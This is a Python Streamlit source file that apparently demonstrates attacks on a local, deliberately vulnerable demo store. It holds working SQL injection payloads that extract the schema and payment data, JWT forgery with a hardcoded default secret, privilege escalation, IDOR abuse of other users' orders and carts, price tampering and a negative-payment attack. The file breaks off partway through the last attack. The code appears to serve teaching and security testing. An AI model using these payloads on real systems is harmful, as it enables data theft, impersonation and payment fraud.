"""Store Attack Simulator - Live attack demonstrations against IAM Store."""

import streamlit as st
import requests
import jwt
import json
import time
from datetime import datetime, timedelta


STORE_API = "http://localhost:8002"
IAM_API = "http://localhost:8000"
JWT_SECRET = "your-secret-key-change-in-production"

ATTACKS = {
    "sql_injection": {
        "name": "SQL Injection",
        "icon": "\U0001f489",
        "severity": "HIGH",
        "description": "Exploit unsanitized search input to extract database schema and data.",
        "target": "GET /api/products?search=...",
    },
    "jwt_forgery": {
        "name": "JWT Token Forgery",
        "icon": "\U0001f511",
        "severity": "CRITICAL",
        "description": "Forge a valid JWT using the known default secret key to impersonate a non-existent user.",
        "target": "JWT with shared secret",
    },
    "privilege_escalation": {
        "name": "Privilege Escalation",
        "icon": "\U0001f451",
        "severity": "CRITICAL",
        "description": "Use a forged admin token to create malicious products in the store.",
        "target": "POST /api/products",
    },
    "idor_orders": {
        "name": "IDOR - Order Access",
        "icon": "\U0001f50d",
        "severity": "HIGH",
        "description": "Access and cancel another user's order without authorization.",
        "target": "GET /api/orders/{id}",
    },
    "idor_cart": {
        "name": "IDOR - Cart Manipulation",
        "icon": "\U0001f6d2",
        "severity": "MEDIUM",
        "description": "Modify or delete another user's cart items.",
        "target": "PUT/DELETE /api/cart/{id}",
    },
    "price_tampering": {
        "name": "Price Tampering",
        "icon": "\U0001f4b0",
        "severity": "CRITICAL",
        "description": "Pay a fraction of the actual price by submitting a manipulated amount.",
        "target": "POST /api/payments/process",
    },
    "negative_payment": {
        "name": "Negative Payment",
        "icon": "\U0001f4b8",
        "severity": "CRITICAL",
        "description": "Submit a negative payment amount to credit money back.",
        "target": "POST /api/payments/process",
    },
    "no_auth_access": {
        "name": "Missing Auth Check",
        "icon": "\U0001f6aa",
        "severity": "MEDIUM",
        "description": "Access product data, perform SQL injection, and browse API docs without any authentication.",
        "target": "GET /api/products",
    },
}

SEVERITY_COLORS = {
    "CRITICAL": "#ff4444",
    "HIGH": "#ff8c00",
    "MEDIUM": "#ffcc00",
    "LOW": "#44cc44",
}


def _log(container, entries, level, message, detail=None):
    """Add a log entry and render all entries."""
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entries.append({"time": timestamp, "level": level, "message": message, "detail": detail})
    _render_log(container, entries)
    time.sleep(0.15)


def _render_log(container, entries):
    """Render log entries as styled HTML."""
    level_styles = {
        "step": ("rgba(99,102,241,0.15)", "#818cf8", "\u25b6"),
        "info": ("rgba(100,116,139,0.1)", "#94a3b8", "\u2022"),
        "send": ("rgba(59,130,246,0.12)", "#60a5fa", "\u2191"),
        "recv": ("rgba(34,197,94,0.12)", "#4ade80", "\u2193"),
        "success": ("rgba(34,197,94,0.15)", "#22c55e", "\u2714"),
        "fail": ("rgba(239,68,68,0.15)", "#ef4444", "\u2718"),
        "vuln": ("rgba(239,68,68,0.2)", "#ff4444", "\u26a0"),
        "warn": ("rgba(234,179,8,0.15)", "#eab308", "\u26a0"),
    }
    html = '<div style="font-family:\'JetBrains Mono\',\'Fira Code\',monospace; font-size:0.78rem; max-height:500px; overflow-y:auto; padding:0.5rem;">'
    for e in entries:
        bg, color, icon = level_styles.get(e["level"], level_styles["info"])
        html += f'<div style="padding:4px 8px; margin:2px 0; border-radius:4px; background:{bg}; border-left:3px solid {color};">'
        html += f'<span style="color:#64748b;">{e["time"]}</span> '
        html += f'<span style="color:{color}; font-weight:600;">{icon}</span> '
        html += f'<span style="color:#e2e8f0;">{e["message"]}</span>'
        if e.get("detail"):
            detail_text = e["detail"]
            if len(detail_text) > 300:
                detail_text = detail_text[:300] + "..."
            html += f'<div style="color:#94a3b8; font-size:0.7rem; margin-top:2px; padding-left:1rem; word-break:break-all;">{detail_text}</div>'
        html += '</div>'
    html += '</div>'
    container.markdown(html, unsafe_allow_html=True)


def _get_token(username="admin", role="admin"):
    """Generate a JWT token."""
    payload = {
        "sub": f"store_user_{username}",
        "username": username,
        "role": role,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=24),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")


def _headers(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def _result(name, severity, success, findings, evidence, impact):
    """Build a standardized result dict."""
    return {
        "name": name,
        "severity": severity,
        "success": success,
        "findings": findings,
        "evidence": evidence,
        "impact": impact,
    }


# ---- ATTACK IMPLEMENTATIONS ----

def attack_sql_injection(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting SQL Injection attack on product search")
        _log(log_container, entries, "info", f"Target: {STORE_API}/api/products?search=...")

        # Step 1: Normal search
        _log(log_container, entries, "step", "Step 1: Testing normal search functionality")
        _log(log_container, entries, "send", "GET /api/products?search=keyboard")
        r = requests.get(f"{STORE_API}/api/products", params={"search": "keyboard"}, timeout=5)
        normal_count = len(r.json()) if isinstance(r.json(), list) else 0
        _log(log_container, entries, "recv", f"HTTP {r.status_code} - {normal_count} product(s) returned")

        # Step 2: Boolean-based injection
        _log(log_container, entries, "step", "Step 2: Attempting boolean-based SQL injection")
        payload = "' OR 1=1--"
        _log(log_container, entries, "send", f"GET /api/products?search={payload}")
        r = requests.get(f"{STORE_API}/api/products", params={"search": payload}, timeout=5)
        data = r.json()
        all_count = len(data) if isinstance(data, list) else 0
        if isinstance(data, list) and all_count > normal_count:
            _log(log_container, entries, "vuln", f"SQL INJECTION CONFIRMED! Returned ALL {all_count} products (bypassed WHERE clause)")
            findings.append(f"Boolean injection returned all {all_count} products (vs {normal_count} normal)")
            evidence["boolean_injection_count"] = all_count
        else:
            _log(log_container, entries, "info", f"Returned {all_count} results")

        # Step 3: UNION-based to extract table names
        _log(log_container, entries, "step", "Step 3: UNION injection to extract database schema")
        payload2 = "' UNION SELECT name,2,3,4,5,6,7,8,9,10,11 FROM sqlite_master WHERE type='table'--"
        _log(log_container, entries, "send", f"GET /api/products?search={payload2}")
        r2 = requests.get(f"{STORE_API}/api/products", params={"search": payload2}, timeout=5)
        data2 = r2.json()
        tables_found = []
        if isinstance(data2, list):
            for item in data2:
                # Table names may appear in various fields depending on column mapping
                for field in ["id", "name", "description", "category"]:
                    val = item.get(field)
                    if isinstance(val, str) and val not in tables_found and val not in ["2", "3", "4", "5", "6", "7", "8", "9", "10", "11"]:
                        tables_found.append(val)
            if tables_found:
                _log(log_container, entries, "vuln", f"DATABASE SCHEMA LEAKED! Found tables: {', '.join(tables_found)}")
                for t in tables_found:
                    _log(log_container, entries, "info", f"  Table: {t}")
                findings.append(f"Extracted {len(tables_found)} table names: {', '.join(tables_found)}")
                evidence["tables"] = tables_found
                impact.append("Database schema exposed")
            else:
                _log(log_container, entries, "info", "UNION query returned data but table names not clearly extractable")
                findings.append("UNION injection executed but table extraction unclear")

        # Step 4: Extract payment data
        _log(log_container, entries, "step", "Step 4: Extracting sensitive payment data")
        payload3 = "' UNION SELECT transaction_id,order_id,amount,method,status,6,7,8,9,10,11 FROM payments--"
        _log(log_container, entries, "send", f"GET /api/products?search={payload3}")
        r3 = requests.get(f"{STORE_API}/api/products", params={"search": payload3}, timeout=5)
        data3 = r3.json()
        payments_leaked = []
        if isinstance(data3, list):
            for item in data3:
                item_id = item.get("id", "")
                if isinstance(item_id, str) and "txn_" in str(item_id):
                    payments_leaked.append(item)
                # Also check name field
                item_name = item.get("name", "")
                if isinstance(item_name, str) and "txn_" in str(item_name):
                    payments_leaked.append(item)
            if payments_leaked:
                _log(log_container, entries, "vuln", f"PAYMENT DATA STOLEN! Found {len(payments_leaked)} transaction(s)")
                for p in payments_leaked[:5]:
                    _log(log_container, entries, "info", f"  Transaction: {p.get('id', '?')} | Amount: {p.get('name', '?')} | Method: {p.get('price', '?')}")
                findings.append(f"Leaked {len(payments_leaked)} payment records")
                evidence["payments_count"] = len(payments_leaked)
                evidence["sample_payments"] = [str(p.get("id", "?")) for p in payments_leaked[:5]]
                impact.append("Payment data stolen")
            else:
                _log(log_container, entries, "info", "No payment records extracted (table may be empty or column mismatch)")
                findings.append("Payment table query executed (may be empty)")

        _log(log_container, entries, "success", "SQL Injection attack complete - multiple injection points confirmed")

        success = len(findings) > 0
        return _result("SQL Injection", "HIGH", success, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("SQL Injection", "HIGH", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("SQL Injection", "HIGH", False, [f"Error: {str(e)}"], {}, [])


def attack_jwt_forgery(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting JWT Token Forgery attack")
        _log(log_container, entries, "info", f"Known secret key: {JWT_SECRET}")

        # Step 1: Forge a token for non-existent user
        _log(log_container, entries, "step", "Step 1: Forging a token for non-existent user 'ghost_hacker'")
        fake_token = _get_token("ghost_hacker", "user")
        decoded = jwt.decode(fake_token, JWT_SECRET, algorithms=["HS256"])
        _log(log_container, entries, "info", f"Forged JWT: {fake_token[:60]}...")
        _log(log_container, entries, "info", f"Token claims: {json.dumps(decoded, default=str)}")
        evidence["forged_token_claims"] = decoded

        # Step 2: Use forged token to add items to cart
        _log(log_container, entries, "step", "Step 2: Using forged token to add items to ghost_hacker's cart")
        _log(log_container, entries, "send", "POST /api/cart (product_id=1, quantity=3)")
        r = requests.post(f"{STORE_API}/api/cart", headers=_headers(fake_token),
                          json={"product_id": 1, "quantity": 3}, timeout=5)
        _log(log_container, entries, "recv", f"HTTP {r.status_code}: {r.text[:120]}")

        if r.status_code == 200:
            _log(log_container, entries, "vuln", "FORGED TOKEN ACCEPTED! Cart item created for non-existent user")
            findings.append("Forged token for ghost_hacker accepted by server")
            impact.append("Non-existent user cart created")

        # Step 3: Verify cart was created
        _log(log_container, entries, "step", "Step 3: Verifying the cart was actually created")
        _log(log_container, entries, "send", "GET /api/cart (ghost_hacker's token)")
        r2 = requests.get(f"{STORE_API}/api/cart", headers=_headers(fake_token), timeout=5)
        if r2.status_code == 200:
            cart = r2.json()
            items = cart.get("items", [])
            total = cart.get("total", 0)
            _log(log_container, entries, "vuln", f"CART CONFIRMED! ghost_hacker has {len(items)} items, total ${total}")
            for item in items:
                _log(log_container, entries, "info", f"  Item: {item.get('product_name', '?')} x{item.get('quantity', '?')} @ ${item.get('unit_price', '?')}")
            findings.append(f"Ghost user cart verified: {len(items)} items, ${total}")
            evidence["cart_response"] = {"items_count": len(items), "total": total}
            impact.append("Arbitrary user impersonation via forged JWT")

        # Step 4: Forge admin token and access admin stats
        _log(log_container, entries, "step", "Step 4: Forging an ADMIN token for ghost_hacker")
        admin_token = _get_token("ghost_hacker", "admin")
        admin_decoded = jwt.decode(admin_token, JWT_SECRET, algorithms=["HS256"])
        _log(log_container, entries, "info", f"Admin token claims: {json.dumps(admin_decoded, default=str)}")

        _log(log_container, entries, "send", "GET /api/admin/stats (forged admin)")
        r3 = requests.get(f"{STORE_API}/api/admin/stats", headers=_headers(admin_token), timeout=5)
        if r3.status_code == 200:
            stats = r3.json()
            _log(log_container, entries, "vuln", f"ADMIN ACCESS! Revenue: ${stats.get('revenue', 0)}, Orders: {stats.get('order_count', 0)}, Products: {stats.get('product_count', 0)}")
            findings.append(f"Forged admin token gave full admin access")
            evidence["admin_stats"] = stats
            impact.append("Full admin access via forged token")

        _log(log_container, entries, "success", "JWT Forgery complete - default secret key allows full impersonation")
        return _result("JWT Token Forgery", "CRITICAL", len(findings) > 0, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("JWT Token Forgery", "CRITICAL", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("JWT Token Forgery", "CRITICAL", False, [f"Error: {str(e)}"], {}, [])


def attack_privilege_escalation(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting Privilege Escalation attack")

        # Step 1: Create regular user token
        _log(log_container, entries, "step", "Step 1: Creating regular user token (role=user) for 'regular_user'")
        user_token = _get_token("regular_user", "user")
        _log(log_container, entries, "info", "Regular user token created")

        # Step 2: Try admin endpoint as regular user
        _log(log_container, entries, "step", "Step 2: Attempting admin access as regular user")
        _log(log_container, entries, "send", "GET /api/admin/stats (role=user)")
        r = requests.get(f"{STORE_API}/api/admin/stats", headers=_headers(user_token), timeout=5)
        if r.status_code == 403:
            _log(log_container, entries, "info", f"HTTP 403 Forbidden - Admin check exists for stats endpoint")
        else:
            _log(log_container, entries, "vuln", f"HTTP {r.status_code} - Regular user accessed admin stats!")
            findings.append("Admin stats accessible without admin role")

        # Step 3: Forge admin token for same user
        _log(log_container, entries, "step", "Step 3: Forging new token with role=admin for 'regular_user'")
        escalated_token = _get_token("regular_user", "admin")
        decoded = jwt.decode(escalated_token, JWT_SECRET, algorithms=["HS256"])
        _log(log_container, entries, "info", f"Escalated claims: username={decoded['username']}, role={decoded['role']}")
        evidence["escalated_claims"] = {"username": decoded["username"], "role": decoded["role"]}

        # Step 4: Create a malicious product
        _log(log_container, entries, "step", "Step 4: Creating malicious product as escalated admin")
        malicious_product = {
            "name": "HACKED - Injected by Attacker",
            "description": "This product was injected via privilege escalation attack",
            "price": 0.01,
            "category_id": 1,
            "stock": 9999,
        }
        _log(log_container, entries, "send", f"POST /api/products: {json.dumps(malicious_product)}")
        r2 = requests.post(f"{STORE_API}/api/products", headers=_headers(escalated_token),
                           json=malicious_product, timeout=5)
        if r2.status_code == 200:
            product_data = r2.json()
            product_id = product_data.get("id") or product_data.get("product_id")
            _log(log_container, entries, "vuln", f"PRODUCT INJECTED! ID={product_id}")
            _log(log_container, entries, "info", f"  Name: {malicious_product['name']}")
            _log(log_container, entries, "info", f"  Price: ${malicious_product['price']} | Stock: {malicious_product['stock']}")
            findings.append(f"Malicious product created (ID={product_id})")
            evidence["injected_product"] = product_data
            impact.append(f"Product 'HACKED - Injected by Attacker' created with price $0.01")

            # Step 5: Read it back to prove it exists
            _log(log_container, entries, "step", "Step 5: Reading back injected product to confirm persistence")
            _log(log_container, entries, "send", f"GET /api/products/{product_id}")
            r3 = requests.get(f"{STORE_API}/api/products/{product_id}", headers=_headers(escalated_token), timeout=5)
            if r3.status_code == 200:
                readback = r3.json()
                _log(log_container, entries, "vuln", f"CONFIRMED! Product persists in database")
                _log(log_container, entries, "info", f"  Name: {readback.get('name')} | Price: ${readback.get('price')} | Stock: {readback.get('stock')}")
                findings.append("Injected product confirmed in database")
                evidence["readback_product"] = readback
                impact.append("Store catalog tampered with fake product")
            else:
                _log(log_container, entries, "info", f"Readback HTTP {r3.status_code}")
        else:
            _log(log_container, entries, "info", f"HTTP {r2.status_code}: {r2.text[:100]}")
            findings.append(f"Product creation returned HTTP {r2.status_code}")

        # Step 6: Access admin orders
        _log(log_container, entries, "step", "Step 6: Accessing all orders as escalated admin")
        _log(log_container, entries, "send", "GET /api/admin/orders (escalated)")
        r4 = requests.get(f"{STORE_API}/api/admin/orders", headers=_headers(escalated_token), timeout=5)
        if r4.status_code == 200:
            orders = r4.json()
            _log(log_container, entries, "vuln", f"ALL ORDERS EXPOSED! Found {len(orders)} order(s)")
            findings.append(f"Admin orders endpoint exposed {len(orders)} orders")
            evidence["orders_exposed"] = len(orders)
            impact.append(f"{len(orders)} orders exposed to escalated user")

        _log(log_container, entries, "success", "Privilege Escalation complete - role claim not validated against IAM")
        return _result("Privilege Escalation", "CRITICAL", len(findings) > 0, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("Privilege Escalation", "CRITICAL", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("Privilege Escalation", "CRITICAL", False, [f"Error: {str(e)}"], {}, [])


def attack_idor_orders(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting IDOR attack on order endpoints")

        # Step 1: Create tokens for two users
        _log(log_container, entries, "step", "Step 1: Creating tokens for alice_victim and bob_attacker")
        alice_token = _get_token("alice_victim", "user")
        bob_token = _get_token("bob_attacker", "user")
        _log(log_container, entries, "info", "Created tokens for alice_victim and bob_attacker")

        # Step 2: Alice adds items and creates an order
        _log(log_container, entries, "step", "Step 2: Alice adds items and creates an order")
        _log(log_container, entries, "send", "POST /api/cart (alice adds product_id=4)")
        r_cart = requests.post(f"{STORE_API}/api/cart", headers=_headers(alice_token),
                               json={"product_id": 4, "quantity": 2}, timeout=5)
        _log(log_container, entries, "recv", f"HTTP {r_cart.status_code}: {r_cart.text[:80]}")

        _log(log_container, entries, "send", "POST /api/orders (alice creates order)")
        r_order = requests.post(f"{STORE_API}/api/orders", headers=_headers(alice_token),
                                json={"shipping_address": "Alice's Secret House, 123 Private Lane"}, timeout=5)
        order_id = None
        if r_order.status_code == 200:
            order_resp = r_order.json()
            order_id = order_resp.get("order_id")
            _log(log_container, entries, "recv", f"Alice's order created: ID={order_id}")
            evidence["alice_order_id"] = order_id
        else:
            _log(log_container, entries, "warn", f"Order creation returned {r_order.status_code}: {r_order.text[:80]}")
            _log(log_container, entries, "info", "Trying with order_id=1 as fallback")
            order_id = 1

        # Step 3: Bob reads Alice's order
        _log(log_container, entries, "step", f"Step 3: Bob (attacker) reads Alice's order #{order_id}")
        _log(log_container, entries, "send", f"GET /api/orders/{order_id} (bob_attacker's token)")
        r2 = requests.get(f"{STORE_API}/api/orders/{order_id}", headers=_headers(bob_token), timeout=5)
        if r2.status_code == 200:
            stolen_order = r2.json()
            _log(log_container, entries, "vuln", f"IDOR CONFIRMED! Bob accessed Alice's order")
            _log(log_container, entries, "vuln", f"  User: {stolen_order.get('user_id')} | Address: {stolen_order.get('shipping_address')}")
            _log(log_container, entries, "vuln", f"  Total: ${stolen_order.get('total_amount')} | Status: {stolen_order.get('status')}")
            items = stolen_order.get("items", [])
            for item in items[:5]:
                _log(log_container, entries, "info", f"  Item: {item.get('product_name', '?')} x{item.get('quantity', '?')} @ ${item.get('unit_price', '?')}")
            findings.append(f"Bob read Alice's order #{order_id} with private address and items")
            evidence["stolen_order"] = {
                "user_id": stolen_order.get("user_id"),
                "address": stolen_order.get("shipping_address"),
                "total": stolen_order.get("total_amount"),
                "items_count": len(items),
            }
            impact.append(f"Order data stolen: address '{stolen_order.get('shipping_address')}'")
        else:
            _log(log_container, entries, "info", f"HTTP {r2.status_code}: {r2.text[:80]}")

        # Step 4: Bob cancels Alice's order
        _log(log_container, entries, "step", f"Step 4: Bob attempts to cancel Alice's order #{order_id}")
        _log(log_container, entries, "send", f"PUT /api/orders/{order_id}/cancel (bob_attacker's token)")
        r3 = requests.put(f"{STORE_API}/api/orders/{order_id}/cancel", headers=_headers(bob_token), timeout=5)
        if r3.status_code == 200:
            _log(log_container, entries, "vuln", f"IDOR! Bob CANCELLED Alice's order #{order_id}!")
            cancel_data = r3.json()
            _log(log_container, entries, "info", f"  Cancel response: {json.dumps(cancel_data)[:150]}")
            findings.append(f"Bob cancelled Alice's order #{order_id}")
            evidence["cancel_response"] = cancel_data
            impact.append(f"Alice's order #{order_id} cancelled by attacker")
        else:
            _log(log_container, entries, "info", f"HTTP {r3.status_code}: {r3.text[:80]}")
            findings.append(f"Cancel attempt returned HTTP {r3.status_code}")

        # Step 5: Verify cancellation
        _log(log_container, entries, "step", "Step 5: Verifying order status after cancellation")
        _log(log_container, entries, "send", f"GET /api/orders/{order_id} (checking status)")
        r4 = requests.get(f"{STORE_API}/api/orders/{order_id}", headers=_headers(alice_token), timeout=5)
        if r4.status_code == 200:
            post_cancel = r4.json()
            _log(log_container, entries, "recv", f"Order status: {post_cancel.get('status')}")
            if post_cancel.get("status") == "cancelled":
                _log(log_container, entries, "vuln", "CONFIRMED: Alice's order is now cancelled!")
                evidence["post_cancel_status"] = post_cancel.get("status")

        _log(log_container, entries, "success", "IDOR attack complete - no ownership verification on orders")
        return _result("IDOR - Order Access", "HIGH", len(findings) > 0, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("IDOR - Order Access", "HIGH", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("IDOR - Order Access", "HIGH", False, [f"Error: {str(e)}"], {}, [])


def attack_idor_cart(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting IDOR attack on cart endpoints")

        # Step 1: Alice adds an item
        _log(log_container, entries, "step", "Step 1: Alice adds an expensive item to her cart")
        alice_token = _get_token("alice_cart_victim", "user")
        _log(log_container, entries, "send", "POST /api/cart (alice adds product_id=3, quantity=2)")
        r = requests.post(f"{STORE_API}/api/cart", headers=_headers(alice_token),
                          json={"product_id": 3, "quantity": 2}, timeout=5)
        _log(log_container, entries, "recv", f"HTTP {r.status_code}: {r.text[:80]}")

        # Get Alice's cart
        _log(log_container, entries, "send", "GET /api/cart (alice - BEFORE attack)")
        r2 = requests.get(f"{STORE_API}/api/cart", headers=_headers(alice_token), timeout=5)
        cart_before = r2.json()
        items_before = cart_before.get("items", [])
        total_before = cart_before.get("total", 0)
        _log(log_container, entries, "recv", f"Alice's cart: {len(items_before)} items, total ${total_before}")
        for item in items_before:
            _log(log_container, entries, "info", f"  {item.get('product_name', '?')} x{item.get('quantity', '?')} @ ${item.get('unit_price', '?')} (item_id={item.get('id')})")
        evidence["cart_before"] = {"items": len(items_before), "total": total_before}

        if items_before:
            target_item_id = items_before[0]["id"]

            # Step 2: Bob modifies Alice's cart item
            _log(log_container, entries, "step", f"Step 2: Bob (attacker) modifies Alice's cart item #{target_item_id}")
            bob_token = _get_token("bob_cart_attacker", "user")

            _log(log_container, entries, "send", f"PUT /api/cart/{target_item_id} quantity=99 (bob's token)")
            r3 = requests.put(f"{STORE_API}/api/cart/{target_item_id}", headers=_headers(bob_token),
                              json={"quantity": 99}, timeout=5)
            if r3.status_code == 200:
                _log(log_container, entries, "vuln", f"IDOR! Bob modified Alice's cart item to quantity=99")
                findings.append(f"Bob changed Alice's cart item #{target_item_id} quantity to 99")
                impact.append("Attacker can modify other users' cart contents")

            # Step 3: Now delete it by setting quantity to 0
            _log(log_container, entries, "step", "Step 3: Bob deletes Alice's cart item (quantity=0)")
            _log(log_container, entries, "send", f"PUT /api/cart/{target_item_id} quantity=0 (bob's token)")
            r4 = requests.put(f"{STORE_API}/api/cart/{target_item_id}", headers=_headers(bob_token),
                              json={"quantity": 0}, timeout=5)
            if r4.status_code == 200:
                _log(log_container, entries, "vuln", f"IDOR! Bob deleted Alice's cart item (set qty=0)")
                findings.append(f"Bob deleted Alice's cart item #{target_item_id}")
                impact.append("Alice's cart item deleted by attacker")

            # Step 4: Check Alice's cart after attack
            _log(log_container, entries, "step", "Step 4: Checking Alice's cart AFTER Bob's attack")
            _log(log_container, entries, "send", "GET /api/cart (alice - AFTER attack)")
            r5 = requests.get(f"{STORE_API}/api/cart", headers=_headers(alice_token), timeout=5)
            cart_after = r5.json()
            items_after = cart_after.get("items", [])
            total_after = cart_after.get("total", 0)
            _log(log_container, entries, "recv", f"Alice's cart now: {len(items_after)} items, total ${total_after}")
            evidence["cart_after"] = {"items": len(items_after), "total": total_after}

            if len(items_after) < len(items_before):
                _log(log_container, entries, "vuln", f"CONFIRMED: Alice's cart went from {len(items_before)} to {len(items_after)} items!")
                findings.append(f"Cart went from {len(items_before)} items (${total_before}) to {len(items_after)} items (${total_after})")
        else:
            _log(log_container, entries, "warn", "Alice's cart was empty - could not test IDOR")
            findings.append("Alice's cart was empty (no items to target)")

        _log(log_container, entries, "success", "IDOR cart attack complete - cart items not scoped to user")
        return _result("IDOR - Cart Manipulation", "MEDIUM", len(findings) > 0, findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("IDOR - Cart Manipulation", "MEDIUM", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("IDOR - Cart Manipulation", "MEDIUM", False, [f"Error: {str(e)}"], {}, [])


def attack_price_tampering(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting Price Tampering attack")
        token = _get_token("price_hacker", "user")

        # Step 1: Add expensive item
        _log(log_container, entries, "step", "Step 1: Adding expensive item ($199.99 Smart Watch) to cart")
        _log(log_container, entries, "send", "POST /api/cart (product_id=4, quantity=1)")
        r = requests.post(f"{STORE_API}/api/cart", headers=_headers(token),
                          json={"product_id": 4, "quantity": 1}, timeout=5)
        _log(log_container, entries, "recv", f"HTTP {r.status_code}: {r.text[:80]}")

        # Step 2: Create order
        _log(log_container, entries, "step", "Step 2: Creating order")
        _log(log_container, entries, "send", "POST /api/orders")
        r2 = requests.post(f"{STORE_API}/api/orders", headers=_headers(token),
                           json={"shipping_address": "Hacker Lane 1337"}, timeout=5)
        if r2.status_code != 200:
            _log(log_container, entries, "warn", f"Order creation: HTTP {r2.status_code}: {r2.text[:80]}")
            _log(log_container, entries, "info", "Cart may be empty")
            return _result("Price Tampering", "CRITICAL", False, ["Could not create order (cart empty)"], {}, [])

        order_data = r2.json()
        order_id = order_data["order_id"]
        _log(log_container, entries, "recv", f"Order #{order_id} created")
        evidence["order_id"] = order_id

        # Step 3: Check actual order total
        _log(log_container, entries, "step", "Step 3: Checking actual order total")
        _log(log_container, entries, "send", f"GET /api/orders/{order_id}")
        r3 = requests.get(f"{STORE_API}/api/orders/{order_id}", headers=_headers(token), timeout=5)
        order_detail = r3.json()
        actual_total = order_detail.get("total_amount", 0)
        _log(log_container, entries, "recv", f"Actual order total: ${actual_total}")
        evidence["actual_total"] = actual_total

        # Step 4: Pay $0.01 instead
        _log(log_container, entries, "step", f"Step 4: Submitting payment of $0.01 for ${actual_total} order")
        tampered_amount = 0.01
        _log(log_container, entries, "send", f'POST /api/payments/process {{"order_id":{order_id},"amount":{tampered_amount},"method":"credit_card"}}')
        r4 = requests.post(f"{STORE_API}/api/payments/process", headers=_headers(token),
                           json={"order_id": order_id, "amount": tampered_amount, "method": "credit_card"}, timeout=5)
        if r4.status_code == 200:
            payment_result = r4.json()
            amount_charged = payment_result.get("amount_charged", tampered_amount)
            txn_id = payment_result.get("transaction_id", "?")
            savings = actual_total - amount_charged if actual_total else 0
            discount_pct = ((savings / actual_total) * 100) if actual_total else 0

            _log(log_container, entries, "vuln", "PRICE TAMPERING SUCCESS!")
            _log(log_container, entries, "vuln", f"  Order total: ${actual_total} | Amount paid: ${amount_charged}")
            _log(log_container, entries, "vuln", f"  Savings: ${savings:.2f} ({discount_pct:.1f}% discount)")
            _log(log_container, entries, "info", f"  Transaction ID: {txn_id}")

            findings.append(f"Paid ${amount_charged} for ${actual_total} order ({discount_pct:.1f}% off)")
            evidence["amount_paid"] = amount_charged
            evidence["transaction_id"] = txn_id
            evidence["savings"] = round(savings, 2)
            impact.append(f"${savings:.2f} revenue lost on order #{order_id}")
            impact.append(f"Transaction {txn_id} recorded with tampered amount")
        else:
            _log(log_container, entries, "info", f"HTTP {r4.status_code}: {r4.text[:80]}")
            findings.append(f"Payment returned HTTP {r4.status_code}")

        _log(log_container, entries, "success", "Price Tampering complete - server trusts client-submitted amount")
        return _result("Price Tampering", "CRITICAL", len(findings) > 0 and any("Paid" in f for f in findings), findings, evidence, impact)

    except requests.ConnectionError:
        _log(log_container, entries, "fail", f"Connection failed to {STORE_API}")
        return _result("Price Tampering", "CRITICAL", False, ["Connection failed"], {}, [])
    except Exception as e:
        _log(log_container, entries, "fail", f"Error: {str(e)}")
        return _result("Price Tampering", "CRITICAL", False, [f"Error: {str(e)}"], {}, [])


def attack_negative_payment(log_container):
    entries = []
    findings = []
    evidence = {}
    impact = []

    try:
        _log(log_container, entries, "step", "Starting Negative Payment attack")
        token = _get_token("neg_hacker", "user")

        # Step 1: Create an order
        _log(log_container, entries, "step", "Step 1: Creating a legitimate order")
        _log(log_container, entries, "send", "POST /api/cart (product_id=1)")
        requests.post(f"{STORE_API}/api/cart", headers=_headers(token),
                      json={"product_id": 1, "quantity": 1}, timeout=5)

        _log(log_container, entries, "send", "POST /api/orders")
        r = requests.post(f"{STORE_API}/api/orders", headers=_headers(token),
                          json={"shipping_address": "Refund Fraud St"}, timeout=5)
        if r.status_code != 200:
            _log(log_container, entries, "warn", f"Order creation: HTTP {r.status_code}: {r.text[:80]}")
            return _result("Negative Payment", "CRITICAL", False, ["Could not create order (cart empty)"], {}, [])

        order_id = r.json()["order_id"]
        _log(log_container, entries, "recv", f"Order #{order_id} created")
        evidence["order_id"] = order_id

        # Step 2: Submit negative payment
        negative_amount = -500.00
        _log(log_container, entries, "step", f"Step 2: Submitting NEGATIVE payment (${negative_amount})")
        _log(log_container, entries, "send", f'POST /api/payments/process {{"order_id":{order_id},"amount":{negative_amount},"method":"credit_card"}}')
        r2 = requests.post(f"{STORE_API}/api/payments/process", headers=_headers(token),
                           json={"order_id": order_id, "amount": negative_amount, "method": "credit_card"}, timeout=5)
        if r2.status_code == 200:
            result = r2.json()
            txn_id = result.get("transaction_id", "?")
            amount_charged = result.get("amount_charged", negative_amount)
            _log(log_container, entries, "vuln", "NEGATIVE PAYMENT ACCEPTED!")
            _log(log_container, entries, "vuln", f"  Amount charged: ${amount_charged}")
            _log(log_container, entries, "vuln", f"  Effect: Store OWES the attacker ${abs(amount_charged)}!")
            _log(log_container, entries, "info", f"  Transaction ID: {txn_id}")
            findings.append(f"Negative payment of ${negative_amount} accepted (txn: {txn_id})")
            evidence["negative_txn_id"] = txn_id
